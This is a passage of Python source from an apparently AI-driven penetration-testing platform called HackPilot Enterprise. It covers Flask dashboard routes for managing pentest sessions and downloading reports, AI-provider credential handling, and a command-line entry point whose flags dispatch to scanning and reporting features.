            target_info = {"target": target, "scope": scope, "auth_key": auth_key}
            session_id = str(uuid.uuid4())
            super().__init__(
                session_id=session_id,
                ai_engine=ai_engine,
                tool_manager=tool_manager,
                target_info=target_info,
                db=kwargs.get("db"),
                cache=kwargs.get("cache"),
                processor=kwargs.get("processor"),
                exploitation=kwargs.get("exploitation"),
                zero_day_detector=kwargs.get("zero_day_detector"),
                compliance=kwargs.get("compliance"),
                report_generator=kwargs.get("report_generator")
            )
        else:
            super().__init__(*args, **kwargs)

class EnterpriseVoiceInterface:
    """Enterprise voice interface"""
    
    def __init__(self):
        self.console = Console()
    
    def listen_for_command(self):
        return None
    
    def speak(self, text):
        pass

class EnterpriseWebDashboard:
    """Enterprise web dashboard"""
    
    def __init__(self, hackpilot_instance):
        self.hackpilot = hackpilot_instance
        self.app = None
        self.setup_app()
        
    def setup_app(self):
        if not flask:
            return
            
        from flask import Flask, render_template, request, jsonify, Response
        from flask_cors import CORS
        import threading
        
        app = Flask(__name__, template_folder='templates', static_folder='static')
        CORS(app)
        app.secret_key = config.SECRET_KEY

        from security.dashboard_auth import init_dashboard_auth
        init_dashboard_auth(app)

        @app.route('/')
        def index():
            return render_template('dashboard.html')
            
        @app.route('/api/sessions', methods=['GET'])
        def get_sessions():
            if not self.hackpilot.db:
                return jsonify([])
            try:
                sessions = self.hackpilot.db.get_recent_sessions(limit=50)
                return jsonify([{
                    "session_id": s.id,
                    "target": s.target,
                    "scope": s.scope,
                    "status": s.status,
                    "created_at": s.created_at.isoformat() if s.created_at else None,
                    "completed_at": s.completed_at.isoformat() if s.completed_at else None,
                    "assessment_type": s.created_by if s.created_by in ['black-box', 'white-box', 'gray-box'] else 'black-box',
                    "compliance_framework": "OWASP"
                } for s in sessions])
            except Exception as e:
                return jsonify({"error": str(e)}), 500

        @app.route('/api/session/<session_id>', methods=['GET'])
        def get_session_detail(session_id):
            if not self.hackpilot.db:
                return jsonify({"error": "Database not initialized"}), 500
            
            try:
                session_obj = self.hackpilot.db.get_pentest_session(session_id)
                if not session_obj:
                    return jsonify({"error": "Session not found"}), 404
                    
                vulns = self.hackpilot.db.get_vulnerabilities_by_session(session_id)
                phases = self.hackpilot.db.get_phase_results(session_id)
                
                # Fetch assessment type stored in created_by (or default)
                ast_type = session_obj.created_by if session_obj.created_by in ['black-box', 'white-box', 'gray-box'] else 'black-box'
                
                return jsonify({
                    "session_id": session_obj.id,
                    "target": session_obj.target,
                    "scope": session_obj.scope,
                    "status": session_obj.status,
                    "created_at": session_obj.created_at.isoformat() if session_obj.created_at else None,
                    "completed_at": session_obj.completed_at.isoformat() if session_obj.completed_at else None,
                    "assessment_type": ast_type,
                    "compliance_framework": "OWASP",
                    "vulnerabilities": [{
                        "id": v.id,
                        "session_id": v.session_id,
                        "phase": v.phase,
                        "severity": v.severity,
                        "cvss_score": v.cvss_score,
                        "cvss_vector": v.cvss_vector,
                        "title": v.title,
                        "description": v.description,
                        "proof_of_concept": v.proof_of_concept,
                        "remediation": v.remediation,
                        "status": v.status
                    } for v in vulns],
                    "phase_results": [{
                        "id": p.id,
                        "phase_name": p.phase_name,
                        "phase_number": p.phase_number,
                        "status": p.status,
                        "started_at": p.started_at.isoformat() if p.started_at else None,
                        "completed_at": p.completed_at.isoformat() if p.completed_at else None,
                        "execution_time": p.execution_time
                    } for p in phases]
                })
            except Exception as e:
                return jsonify({"error": str(e)}), 500

        @app.route('/api/pentest/start', methods=['POST'])
        def start_pentest():
            try:
                data = request.json or {}
                # Map created_by parameter to the assessment type because the schema's created_by column can store a string
                target_info = {
                    "target": data.get("target"),
                    "scope": data.get("scope"),
                    "assessment_type": data.get("assessment_type", "black-box"),
                    "compliance_framework": data.get("compliance_framework", "OWASP"),
                    "auth_key": data.get("auth_key"),
                    "created_by": data.get("assessment_type", "black-box"), # store type in created_by field
                    "parallel_execution": data.get("parallel_execution", True),
                    "ai_enhanced": data.get("ai_enhanced", True)
                }
                
                # Start pentest in background thread
                thread = threading.Thread(
                    target=self.hackpilot.run_full_enterprise_pentest,
                    args=(target_info,)
                )
                thread.daemon = True
                thread.start()
                
                return jsonify({
                    "status": "started",
                    "message": "Enterprise pentest initiated"
                })
            except Exception as e:
                return jsonify({
                    "status": "error",
                    "message": str(e)
                }), 500

        @app.route('/api/session/<session_id>/cancel', methods=['POST'])
        def cancel_pentest(session_id):
            if not self.hackpilot.db:
                return jsonify({"error": "Database not initialized"}), 500

            try:
                self.hackpilot.db.update_session_status(session_id, 'cancelled', 'system')
                return jsonify({"status": "cancelled", "session_id": session_id})
            except Exception as e:
                return jsonify({"error": str(e)}), 500

        @app.route('/api/session/<session_id>', methods=['DELETE'])
        def delete_session(session_id):
            """Delete one session and all its findings/phase results/attack chains."""
            if not self.hackpilot.db:
                return jsonify({"error": "Database not initialized"}), 500
            try:
                deleted = self.hackpilot.db.delete_session(session_id)
                if not deleted:
                    return jsonify({"error": "Session not found"}), 404
                return jsonify({"status": "deleted", "session_id": session_id})
            except Exception as e:
                return jsonify({"error": str(e)}), 500

        @app.route('/api/sessions', methods=['DELETE'])
        def delete_all_sessions():
            """Wipe every session and all findings - full assessment history reset."""
            if not self.hackpilot.db:
                return jsonify({"error": "Database not initialized"}), 500
            try:
                count = self.hackpilot.db.delete_all_sessions()
                return jsonify({"status": "deleted", "sessions_deleted": count})
            except Exception as e:
                return jsonify({"error": str(e)}), 500

        @app.route('/api/session/<session_id>/report', methods=['GET'])
        def download_report(session_id):
            """Generate and download a report for this session. ?format=pdf|html|json (default pdf)."""
            if not self.hackpilot.db:
                return jsonify({"error": "Database not initialized"}), 500
            if not self.hackpilot.report_generator:
                return jsonify({"error": "Report generator not initialized"}), 500

            try:
                session_obj = self.hackpilot.db.get_pentest_session(session_id)
                if not session_obj:
                    return jsonify({"error": "Session not found"}), 404

                vulns = self.hackpilot.db.get_vulnerabilities_by_session(session_id)
                phase_results = self.hackpilot.db.get_phase_results(session_id)
                session_data = {
                    "target": session_obj.target,
                    "scope": session_obj.scope,
                    "created_at": session_obj.created_at.isoformat() if session_obj.created_at else "",
                    "vulnerabilities": [{
                        "title": v.title,
                        "severity": v.severity,
                        "description": v.description,
                        "remediation": v.remediation,
                        "cvss_score": v.cvss_score,
                        "cvss_vector": v.cvss_vector,
                        "sources": v.sources,
                        "confidence": v.confidence,
                        "evidence": v.evidence,
                    } for v in vulns],
                    "phase_results": [{
                        "phase_name": p.phase_name,
                        "tools_used": p.tools_used,
                    } for p in phase_results],
                }

                report_data = self.hackpilot.report_generator.generate_executive_report([session_data])
                safe_target = "".join(c if c.isalnum() or c in "-_." else "_" for c in session_obj.target)
                filename = f"hackpilot_report_{safe_target}_{session_id[:8]}"
                fmt = request.args.get('format', 'pdf').lower()

                if fmt == 'json':
                    payload = json.dumps(report_data, indent=2, default=str)
                    return Response(payload, mimetype='application/json',
                                     headers={"Content-Disposition": f"attachment; filename={filename}.json"})

                if fmt == 'html':
                    html_content = self.hackpilot.report_generator.export_report(report_data, 'html')
                    return Response(html_content, mimetype='text/html',
                                     headers={"Content-Disposition": f"attachment; filename={filename}.html"})

                # pdf (default)
                output_path = self.hackpilot.report_generator.export_report(report_data, 'pdf')
                try:
                    if output_path.endswith('.html'):
                        # weasyprint unavailable in this build - be honest and hand back
                        # the HTML fallback rather than mislabeling it as a PDF.
                        with open(output_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                        return Response(content, mimetype='text/html',
                                         headers={"Content-Disposition": f"attachment; filename={filename}.html"})
                    # output_path may be "<...>.pdf" or, when REPORT_ENCRYPTION_KEY
                    # is configured, "<...>.pdf.enc" - read_report_file decrypts
                    # transparently in memory either way.
                    from security.report_crypto import read_report_file
                    content = read_report_file(output_path)
                    # SHA256 of the plaintext PDF this response carries, so the
                    # recipient can verify integrity without a separate sidecar
                    # file (this PDF is generated on demand and deleted right
                    # after serving - there's no standing file to ship one next to).
                    report_sha256 = hashlib.sha256(content).hexdigest()
                    return Response(content, mimetype='application/pdf',
                                     headers={
                                         "Content-Disposition": f"attachment; filename={filename}.pdf",
                                         "X-Report-SHA256": report_sha256,
                                     })
                finally:
                    if os.path.exists(output_path):
                        os.remove(output_path)
            except Exception as e:
                return jsonify({"error": str(e)}), 500

        # ------------------------------------------------------------------
        # AI provider configuration (OrcaRouter Cyber Inference)
        # ------------------------------------------------------------------

        def _orcarouter_registry():
            """Import the provider registry late so optional deps stay soft."""
            from ai_engine import orcarouter
            from ai_engine.model_registry import (
                ModelProvider,
                get_available_providers,
                get_models_by_provider,
                normalize_provider,
            )

            return (
                orcarouter,
                ModelProvider,
                get_available_providers,
                get_models_by_provider,
                normalize_provider,
            )

        def _model_payload(model):
            return {
                "id": model.model_id,
                "name": model.display_name,
                "context_window": model.context_window,
                "description": model.description,
                "input_modalities": list(model.input_modalities),
                "reasoning_efforts": list(model.reasoning_efforts),
            }

        @app.route('/api/ai/providers', methods=['GET'])
        def ai_providers():
            try:
                (
                    orcarouter,
                    _provider_enum,
                    get_available_providers,
                    _models_for,
                    _normalize,
                ) = _orcarouter_registry()
            except Exception as e:
                return jsonify({"error": "AI registry unavailable", "detail": str(e)}), 503

            return jsonify({
                "providers": get_available_providers(),
                "orcarouter": {
                    "id": orcarouter.PROVIDER_ID,
                    "name": orcarouter.DISPLAY_NAME,
                    "base_url": orcarouter.resolve_api_base(config.ORCAROUTER_BASE_URL),
                    "brand_url": orcarouter.BRAND_URL,
                    "cyber_url": orcarouter.CYBER_URL,
                    "models_url": orcarouter.CYBER_MODELS_URL,
                    "key_dashboard_url": orcarouter.KEY_DASHBOARD_URL,
                    "recommended_model": orcarouter.DEFAULT_CYBER_MODEL,
                    "recommended_models": list(orcarouter.CYBER_MODEL_IDS),
                    "fallback_model": orcarouter.FALLBACK_MODEL_ID,
                    "credential": orcarouter.credential_store.status(),
                },
            })

        @app.route('/api/ai/models', methods=['GET'])
        def ai_models():
            """Return a capability-filtered model list for the selected provider.

            The OrcaRouter credential never leaves the server: discovery runs
            here and only minimal model metadata is returned to the browser.
            """
            try:
                (
                    orcarouter,
                    provider_enum,
                    _available,
                    get_models_by_provider,
                    normalize_provider,
                ) = _orcarouter_registry()
            except Exception as e:
                return jsonify({"error": "AI registry unavailable", "detail": str(e)}), 503

            provider_id = (request.args.get('provider') or orcarouter.PROVIDER_ID).lower()
            capability = (request.args.get('capability') or 'chat').lower()
            modality_arg = (
                request.args.get('input_modalities')
                or request.args.get('modalities')
                or ''
            )
            required = [m.strip().lower() for m in modality_arg.split(',') if m.strip()]

            provider = normalize_provider(provider_id)
            if provider is None:
                return jsonify({"error": "unknown_provider"}), 400

            if provider is not provider_enum.ORCAROUTER:
                if capability != 'chat':
                    return jsonify({
                        "provider": provider.value,
                        "capability": capability,
                        "source": "static",
                        "degraded": False,
                        "reason": "capability_not_registered",
                        "models": [],
                    })
                models = [_model_payload(m) for m in get_models_by_provider(provider)]
                return jsonify({
                    "provider": provider.value,
                    "capability": capability,
                    "source": "static",
                    "degraded": False,
                    "reason": "",
                    "models": models,
                })

            credential = orcarouter.credential_store.resolve()
            try:
                result = orcarouter.discover_models(
                    credential.key if credential else None,
                    capability=capability,
                    base_url=config.ORCAROUTER_BASE_URL,
                    required_input_modalities=required,
                )
            except orcarouter.OrcaRouterAuthError:
                orcarouter.credential_store.mark_needs_reauth()
                return jsonify({
                    "error": "reauthentication_required",
                    "message": (
                        "OrcaRouter rejected the stored credential. Update the "
                        "API key to continue."
                    ),
                    "credential": orcarouter.credential_store.status(),
                }), 401

            return jsonify({
                "provider": orcarouter.PROVIDER_ID,
                "capability": capability,
                "source": result.source,
                "degraded": result.degraded,
                "reason": result.reason,
                "models": [_model_payload(m) for m in result.models],
            })

        @app.route('/api/ai/providers/orcarouter/credential', methods=['POST'])
        def set_orcarouter_credential():
            try:
                orcarouter, _p, _a, _m, _n = _orcarouter_registry()
            except Exception as e:
                return jsonify({"error": "AI registry unavailable", "detail": str(e)}), 503

            data = request.json or {}
            secret = data.get('api_key') or ''
            try:
                orcarouter.credential_store.set_runtime_key(secret)
            except ValueError as e:
                return jsonify({"error": "invalid_key", "message": str(e)}), 400
            # Only the masked status is returned; the key stays server-side.
            return jsonify({"status": orcarouter.credential_store.status()})

        @app.route('/api/ai/providers/orcarouter/credential', methods=['DELETE'])
        def clear_orcarouter_credential():
            try:
                orcarouter, _p, _a, _m, _n = _orcarouter_registry()
            except Exception as e:
                return jsonify({"error": "AI registry unavailable", "detail": str(e)}), 503

            orcarouter.credential_store.clear()
            return jsonify({"status": orcarouter.credential_store.status()})

        self.app = app
        
    def run(self):
        if not self.app:
            print("Flask is not available, cannot start Web Dashboard.")
            return
        from security.dashboard_auth import resolve_dashboard_host
        self.app.run(host=resolve_dashboard_host(), port=8080, debug=False)

class BasicReportGenerator:
    """Basic report generator fallback"""
    
    def __init__(self):
        pass
    
    def generate_report(self, session_id, results):
        return {"report": "Basic report generated"}

def main():
    """Entry point for HackPilot Enterprise"""
    parser = argparse.ArgumentParser(description="HackPilot Enterprise - AI-Powered Penetration Testing Platform")
    parser.add_argument('--target', help='Target IP or domain')
    parser.add_argument('--scope', help='Scope description')
    parser.add_argument('--auth-key', help='Authorization key')
    parser.add_argument('--assessment-type', choices=['black-box', 'white-box', 'gray-box'], default='black-box')
    parser.add_argument('--compliance', choices=['OWASP', 'NIST', 'ISO27001', 'SOC2'], default='OWASP')
    parser.add_argument('--api', action='store_true', help='Start API server only')
    parser.add_argument('--web', action='store_true', help='Start web dashboard only')
    parser.add_argument('--realtime', action='store_true', help='Start real-time dashboard only')
    parser.add_argument('--voice', action='store_true', help='Start voice interface mode')
    parser.add_argument('--config', default='config.ini', help='Configuration file path')
    parser.add_argument('--model', help='AI model ID (e.g. gpt-astra, openrouter/auto, 9brouter/agent-router)')
    parser.add_argument('--provider', help='AI provider (e.g. openai, openrouter, 9brouter, custom_router, anthropic, google, etc.)')
    parser.add_argument('--custom-route', help='Custom router base URL endpoint (e.g. http://localhost:8000/v1 or https://openrouter.ai/api/v1)')
    parser.add_argument('--fetch-models', action='store_true', help='Auto-fetch and discover models from configured AI providers')
    parser.add_argument('--list-models', action='store_true', help='List all available AI models (catalog + dynamic)')
    parser.add_argument('--cve-lookup', help='Lookup CVE threat intelligence by ID or search text (e.g. CVE-2021-44228)')
    parser.add_argument('--attack-chain', action='store_true', help='Synthesize and display automated multi-stage attack graph')
    parser.add_argument('--mermaid', action='store_true', help='Output Mermaid flowchart diagram for synthesized attack graph')
    parser.add_argument('--llm-redteam', action='store_true', help='Run AI Red Teaming & LLM vulnerability assessment (OWASP Top 10 for LLMs)')
    parser.add_argument('--api-scan', nargs='?', const='mock', help='Run API Security assessment on OpenAPI spec path or run benchmark scan')
    parser.add_argument('--export-sigma', action='store_true', help='Export Detection-as-Code Sigma rules and Splunk SPL queries')
    parser.add_argument('--export-ansible', action='store_true', help='Generate automated Ansible remediation playbooks')
    parser.add_argument('--d3fend-matrix', action='store_true', help='Display MITRE D3FEND defensive countermeasure matrix')
    parser.add_argument('--cspm-scan', nargs='?', const='mock', help='Run Cloud Security Posture (CSPM/KSPM) audit on Terraform/K8s path or mock benchmark')
    parser.add_argument('--k8s-audit', nargs='?', const='mock', help='Audit Kubernetes manifest YAML file for Pod Security Standards (PSS) & RBAC')
    parser.add_argument('--export-cloud-fix', nargs='?', const='reports/cloud_remediation.sh', default=None, help='Export automated Cloud & Terraform remediation scripts')
    
    args = parser.parse_args()
    
    # Update config file path if specified
    if args.config != 'config.ini':
        global config
        config = Config(args.config)
    
    # Initialize HackPilot Enterprise with CLI overrides
    hackpilot = EnterpriseHackPilot(
        model=args.model,
        provider=args.provider,
        custom_route=args.custom_route,
    )
    hackpilot = hackpilot
    
    if args.fetch_models:
        hackpilot.show_banner()
        hackpilot.fetch_and_show_models()
        return
    elif args.list_models:
        hackpilot.show_banner()
        hackpilot.list_and_show_models()
        return
    elif args.cve_lookup:
        hackpilot.show_banner()
        hackpilot.cve_intelligence_lookup(args.cve_lookup)
        return
    elif args.attack_chain or args.mermaid:
        hackpilot.show_banner()
        hackpilot.attack_chain_analysis(sample_mode=True, mermaid_only=args.mermaid)
        return
    elif args.llm_redteam:
        hackpilot.show_banner()
        hackpilot.run_llm_red_team(mock=(not bool(config.OPENAI_API_KEY)))
        return
    elif args.api_scan:
        hackpilot.show_banner()
        spec_content = None
        if args.api_scan != 'mock' and os.path.exists(args.api_scan):
            with open(args.api_scan, 'r', encoding='utf-8') as f:
                spec_content = f.read()
        hackpilot.run_api_security_scan(spec_input=spec_content)
        return
    elif args.export_sigma:
        hackpilot.show_banner()
        hackpilot.export_sigma_detection_rules()
        return
    elif args.export_ansible:
        hackpilot.show_banner()
        hackpilot.generate_remediation_playbooks()
        return
    elif args.d3fend_matrix:
        hackpilot.show_banner()
        hackpilot.show_d3fend_matrix()
        return
    elif args.cspm_scan is not None:
        hackpilot.show_banner()
        hackpilot.run_cspm_scan(target_input=args.cspm_scan, export_fixes=args.export_cloud_fix)
        return
    elif args.k8s_audit is not None:
        hackpilot.show_banner()
        hackpilot.run_cspm_scan(target_input=args.k8s_audit, export_fixes=args.export_cloud_fix)
        return
    elif args.api:
        hackpilot.start_api_server()
    elif args.web:
        hackpilot.launch_web_dashboard()
    elif args.realtime:
        hackpilot.start_realtime_dashboard()
    elif args.voice:
        hackpilot.voice_command_mode()
    elif all([args.target, args.scope, args.auth_key]):
        # Direct execution mode
        target_info = {
            "target": args.target,
            "scope": args.scope,
            "assessment_type": args.assessment_type,
            "compliance_framework": args.compliance,
            "auth_key": args.auth_key,
            "parallel_execution": True,
            "ai_enhanced": True
        }
        hackpilot.show_banner()
        hackpilot.run_full_enterprise_pentest(target_info)
    else:
        # Interactive mode
        hackpilot.run()

if __name__ == "__main__":
    main()
